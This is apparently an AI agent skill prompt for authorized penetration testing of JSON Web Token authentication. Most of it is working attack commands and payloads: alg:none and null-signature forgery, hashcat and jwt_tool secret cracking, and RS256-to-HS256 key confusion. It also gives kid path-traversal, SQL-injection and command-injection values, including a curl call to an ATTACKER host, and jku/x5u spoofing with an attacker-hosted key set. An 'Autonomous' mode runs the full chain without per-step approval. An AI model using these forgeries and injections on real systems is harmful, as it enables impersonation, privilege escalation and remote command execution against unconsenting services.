---
name: jwt-attacks
description: >
  Exploit JWT (JSON Web Token) vulnerabilities during authorized penetration
  testing. Use when the user has found JWTs in authentication, wants to forge
  tokens, or needs to bypass JWT-based access control. Also triggers on: "JWT
  attack", "JWT bypass", "forge JWT", "alg none", "algorithm confusion",
  "RS256 to HS256", "kid injection", "jwk injection", "jku spoofing",
  "crack JWT secret", "brute force JWT", "JWT key confusion", "weak JWT
  secret", "json web token exploit", "JWT header injection", "ViewState JWT",
  "jwt_tool", "JWT privilege escalation", "JWT claim tampering".
  OPSEC: low — token manipulation is client-side; brute-forcing is offline.
  Tools: jwt_tool, hashcat, burpsuite (JWT Editor extension), openssl.
  Do NOT use for session token manipulation that isn't JWT-based.
  Do NOT use for OAuth-specific attacks beyond JWT token forgery.
---

# JWT Attacks

You are helping a penetration tester exploit JWT (JSON Web Token)
vulnerabilities. The target application uses JWTs for authentication or
authorization, and weaknesses in signature verification, algorithm handling,
or key management allow token forgery or privilege escalation. All testing is
under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Decode token, run through attack chain systematically
  (none → null sig → brute force → key confusion → header injection).
  Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (token decoded,
  attack confirmed, privilege escalated, pivot to another skill):
  `### [HH:MM] jwt-attacks → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `jwt-forged-admin-token.txt`, `jwt-cracked-secret.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[jwt-attacks] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [HH:MM] jwt-attacks → <target>
   - Invoked (assessment starting)
   ```

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- A JWT token from the target application (Authorization header, cookie, or
  parameter)
- Tools: `jwt_tool` (`pip install jwt-tool` or clone
  https://github.com/ticarpi/jwt_tool), `hashcat` (mode 16500), Burp Suite
  with JWT Editor extension
- Optional: `openssl` for key extraction, `jws2pubkey` for RSA key recovery

## Step 1: Assess

If not already provided, determine:

1. **Locate JWTs** — check these locations:

| Location | Header/Field |
|----------|-------------|
| Authorization header | `Authorization: Bearer eyJ...` |
| Cookies | `token=eyJ...`, `session=eyJ...`, `jwt=eyJ...` |
| URL parameters | `?token=eyJ...` |
| POST body | `{"token":"eyJ..."}` |
| Hidden form fields | `<input name="token" value="eyJ...">` |

2. **Decode the token** — JWTs have three Base64URL-encoded parts: `header.payload.signature`

```bash
# Quick decode (jwt_tool)
python3 jwt_tool.py eyJ0eXAi...

# Manual decode
echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d 2>/dev/null
# {"alg":"HS256","typ":"JWT"}
```

3. **Identify the algorithm** — determines which attacks apply:

| Algorithm | Type | Attacks |
|-----------|------|---------|
| HS256/384/512 | Symmetric (HMAC) | Brute force, alg:none, null sig |
| RS256/384/512 | Asymmetric (RSA) | Key confusion, header injection, alg:none |
| ES256/384/512 | Asymmetric (ECDSA) | Nonce reuse, header injection, alg:none |
| PS256/384/512 | Asymmetric (RSA-PSS) | Header injection, alg:none |

4. **Check for public keys** — needed for key confusion and key recovery:

```bash
# Common JWKS endpoints
curl -s https://TARGET/.well-known/jwks.json
curl -s https://TARGET/jwks.json
curl -s https://TARGET/openid/connect/jwks.json
curl -s https://TARGET/api/keys
curl -s https://TARGET/oauth2/v1/certs

# Extract from TLS certificate
openssl s_client -connect TARGET:443 2>&1 < /dev/null | \
  sed -n '/-----BEGIN/,/-----END/p' > cert.pem
openssl x509 -pubkey -in cert.pem -noout > pubkey.pem
```

5. **Note interesting claims** in the payload:

| Claim | Significance |
|-------|-------------|
| `sub` | User identifier — change to impersonate |
| `role` / `admin` | Authorization — escalate privileges |
| `exp` | Expiration — extend or remove |
| `iss` | Issuer — cross-service relay |
| `kid` | Key ID — injection target (Step 6) |
| `jku` / `x5u` | Key URL — SSRF / spoofing target (Step 6) |

Skip if context was already provided.

## Step 2: Algorithm None (CVE-2015-9235)

The simplest attack. If the server accepts `alg: "none"`, forge any token
without a signature.

```bash
# jwt_tool — automatic none attack
python3 jwt_tool.py eyJ0eXAi... -X a
```

**Manual construction** — set algorithm to none, empty signature:

```bash
# Header: {"alg":"none","typ":"JWT"}
# Payload: (modified claims)
# Signature: (empty — token ends with trailing dot)

echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

echo -n '{"sub":"admin","role":"admin","iat":1516239022}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# Combine: header.payload.
# Note trailing dot (empty signature)
```

**Algorithm case variants** (bypass naive validation):

| Variant | Header Value |
|---------|-------------|
| Standard | `"alg":"none"` |
| Capitalized | `"alg":"None"` |
| Uppercase | `"alg":"NONE"` |
| Mixed | `"alg":"nOnE"` |

If accepted → Critical finding. Forge admin token with desired claims.

## Step 3: Null Signature (CVE-2020-28042)

Keep the algorithm header but strip the signature. Some implementations
check the algorithm but skip signature verification.

```bash
# jwt_tool — null signature attack
python3 jwt_tool.py eyJ0eXAi... -X n
```

**Manual**: Take a valid JWT, modify payload claims, replace signature with empty
string (keep the trailing dot).

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

## Step 4: Brute Force Weak Secret (HS256)

If the token uses HMAC (HS256/384/512), the signing secret may be weak.

### hashcat (GPU-accelerated)

```bash
# Save the full JWT to a file
echo -n 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature' > jwt.txt

# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (6-8 char mixed case)
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

### jwt_tool dictionary

```bash
python3 jwt_tool.py eyJ0eXAi... -C -d /usr/share/wordlists/rockyou.txt
```

### Common weak secrets

Check against the [jwt-secrets](https://github.com/wallarm/jwt-secrets) wordlist (3500+ entries):

```
secret
password
123456
your_jwt_secret
change_this_super_secret_random_string
key
test
admin
qwerty
```

If cracked → **forge tokens with known secret**:

```bash
# Forge with jwt_tool
python3 jwt_tool.py eyJ0eXAi... -T -S hs256 -p "cracked_secret"
# Interactive: modify claims, then sign

# Forge with Python
python3 -c "
import jwt
token = jwt.encode({'sub':'admin','role':'admin'}, 'cracked_secret', algorithm='HS256')
print(token)
"
```

## Step 5: Key Confusion — RS256 to HS256 (CVE-2016-5431)

When the server uses RS256 (asymmetric), change the algorithm to HS256
(symmetric). The server may use the **public key** as the HMAC secret.

**Requires**: The RSA public key (from JWKS endpoint, TLS cert, or recovery).

### jwt_tool

```bash
python3 jwt_tool.py eyJ0eXAi... -X k -pk pubkey.pem
```

### Manual (openssl + Python)

```bash
# 1. Get public key hex
cat pubkey.pem | xxd -p | tr -d '\n'

# 2. Create header + payload
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: (modified claims)

# 3. Sign with public key as HMAC secret
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9" | \
  openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat pubkey.pem | xxd -p | tr -d '\n')

# 4. Convert hex signature to Base64URL
python3 -c "
import base64, binascii
sig_hex = 'HEX_OUTPUT_HERE'
print(base64.urlsafe_b64encode(binascii.a2b_hex(sig_hex)).rstrip(b'=').decode())
"
```

### Burp JWT Editor workflow

1. Obtain public key from `/.well-known/jwks.json`
2. JWT Editor Keys → New RSA Key → paste JWK
3. Copy the PEM (public key) from the key dialog
4. Base64-encode the PEM
5. JWT Editor Keys → New Symmetric Key → replace `k` value with Base64-encoded PEM
6. Edit JWT: change `alg` to `HS256`, modify payload claims
7. Sign with the symmetric key

### RSA public key recovery

If no JWKS endpoint exists, recover the public key from two signed tokens:

```bash
# Requires two different JWTs signed with the same RSA key
docker run -it ttervoort/jws2pubkey "$(cat jwt1.txt)" "$(cat jwt2.txt)" | tee pubkey.jwk
```

## Step 6: Header Injection Attacks

### 6a. kid (Key ID) Injection

The `kid` header selects which key verifies the token. If it's used in file
paths or database queries, it's injectable.

**Path traversal — sign with known file content:**

```bash
# /dev/null = empty content → sign with empty string
python3 jwt_tool.py eyJ0eXAi... -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# /proc/sys/kernel/randomize_va_space = "2" → sign with "2"
python3 jwt_tool.py eyJ0eXAi... -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

**SQL injection — force a known secret:**

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1' UNION SELECT 'ATTACKER_SECRET' -- -"
}
```

Then sign the token with `ATTACKER_SECRET` as the HMAC key.

```bash
python3 jwt_tool.py eyJ0eXAi... -I -hc kid -hv "' UNION SELECT 'ATTACKER' -- -" -S hs256 -p "ATTACKER"
```

**Command injection** (if kid is used in shell commands):

```json
{
  "kid": "/path/to/key; curl http://ATTACKER/$(whoami)"
}
```

### 6b. jwk (JSON Web Key) Embedding (CVE-2018-0114)

Embed an attacker-controlled public key directly in the JWT header. The
server uses it to verify the token you signed with your private key.

```bash
# jwt_tool — automatic JWK injection
python3 jwt_tool.py eyJ0eXAi... -X i
```

**Burp JWT Editor**: Edit JWT → Attack → Embedded JWK

**Manual**: Generate RSA keypair, sign token with private key, embed public
key as `jwk` in header:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "e": "AQAB",
    "n": "<attacker-public-key-modulus>"
  }
}
```

### 6c. jku (JWK Set URL) Spoofing

Point the `jku` header to an attacker-controlled JWKS endpoint. The server
fetches your public key and uses it to verify the token.

```bash
# jwt_tool — automatic jku spoofing
python3 jwt_tool.py eyJ0eXAi... -X s -ju https://ATTACKER/jwks.json
```

**Setup attacker JWKS:**

```bash
# Generate keypair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# Extract n and e for JWKS
python3 -c "
from Crypto.PublicKey import RSA
import base64
key = RSA.import_key(open('attacker_pub.pem').read())
n = base64.urlsafe_b64encode(key.n.to_bytes((key.n.bit_length()+7)//8, 'big')).rstrip(b'=').decode()
e = base64.urlsafe_b64encode(key.e.to_bytes((key.e.bit_length()+7)//8, 'big')).rstrip(b'=').decode()
print(f'{{\"keys\":[{{\"kty\":\"RSA\",\"kid\":\"attacker\",\"use\":\"sig\",\"n\":\"{n}\",\"e\":\"{e}\"}}]}}')
" > jwks.json

# Host JWKS (serve on attacker machine)
python3 -m http.server 8080
```

**Forged JWT header:**

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "attacker",
  "jku": "https://ATTACKER:8080/jwks.json"
}
```

**jku URL restrictions bypass** (if server validates domain):
- `https://TARGET/.well-known/jwks.json@ATTACKER/jwks.json`
- `https://TARGET#@ATTACKER/jwks.json`
- `https://ATTACKER/jwks.json?TARGET`
- Open redirect on target: `https://TARGET/redirect?url=https://ATTACKER/jwks.json`
- Fragment: `https://TARGET/.well-known/jwks.json#ATTACKER`

### 6d. x5u / x5c Certificate Injection

**x5u** — point to attacker-controlled X.509 certificate:

```bash
# Generate self-signed cert
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt

# Host cert, set x5u header to https://ATTACKER/attacker.crt
# Sign token with attacker.key
```

**x5c** — embed attacker certificate chain directly in the header:

```bash
# Base64-encode certificate (without PEM headers)
cat attacker.crt | grep -v '^-----' | tr -d '\n'
# Embed in x5c array in JWT header
```

## Step 7: Claim Tampering

After finding a signing bypass (Steps 2-6), modify claims for privilege
escalation.

### Common escalation targets

```json
// User → Admin
{"sub":"1234","role":"user"} → {"sub":"1234","role":"admin"}

// Add admin flag
{"sub":"user1"} → {"sub":"user1","admin":true}

// Impersonate another user
{"sub":"lowpriv-user"} → {"sub":"admin-user-id"}

// Change email / username
{"email":"attacker@evil.com"} → {"email":"admin@target.com"}
```

### Expiration bypass

```json
// Remove exp claim entirely
{"sub":"user","exp":1516239022} → {"sub":"user"}

// Extend to far future
{"sub":"user","exp":1516239022} → {"sub":"user","exp":9999999999}
```

### Cross-service relay

If multiple services trust the same JWT issuer:
1. Obtain a valid JWT from Service B
2. Replay it against Service A
3. If Service A accepts → account takeover across services

## Step 8: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **Admin token forged**: Access admin endpoints, route to further
  application exploitation
- **Secret key cracked**: Forge tokens for any user — mass impersonation
- **SSRF via jku/x5u**: Route to **ssrf** for cloud metadata, internal
  service access
- **SQLi via kid**: Route to **sql-injection-union** or
  **sql-injection-blind** for database extraction
- **Command injection via kid**: Route to **command-injection** for RCE
- **Credentials found in JWT claims**: Check for password hashes, API keys,
  connection strings in token payload

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: the forged token, confirmed attack type, target
algorithm, current mode, and any secrets recovered.

## OPSEC Notes

- Token forgery is client-side — no server-side artifacts from crafting
- Brute-forcing is offline — no failed login attempts
- jku/x5u attacks cause server-side HTTP requests (logged, may trigger SSRF
  detection)
- Sending forged tokens to endpoints generates normal HTTP traffic but may
  trigger auth failure logging if the attack fails
- jwt_tool's `-M at` mode sends many requests — rate limit or use targeted
  attacks

## Troubleshooting

### alg:none Rejected

- Try case variants: `None`, `NONE`, `nOnE`
- Ensure signature is empty but trailing dot is present: `header.payload.`
- Some libraries reject `none` but accept `null` or empty string for `alg`

### Key Confusion Fails

- Verify you have the correct public key (check JWKS `kid` matches token `kid`)
- Public key must include PEM headers (`-----BEGIN PUBLIC KEY-----`)
- Some libraries explicitly reject HS256 when configured for RS256 — this
  attack only works on libraries that accept any algorithm from the token
- Try both PKCS#1 and PKCS#8 PEM formats

### hashcat Not Cracking

- Confirm token is a valid JWT (three Base64URL segments)
- Ensure the full JWT (header.payload.signature) is in the hash file
- Mode 16500 only supports HS256 — use 16600 for HS384 and 16700 for HS512
- Try the jwt-secrets wordlist: https://github.com/wallarm/jwt-secrets

### jwt_tool Errors

- Install dependencies: `pip install pycryptodomex requests termcolor`
- For key confusion, use `-pk` with a PEM file (not JWK)
- For jku spoofing, the JWKS must be served over HTTPS if the target
  validates the scheme
- Use `-V` for verbose output to see what jwt_tool is sending
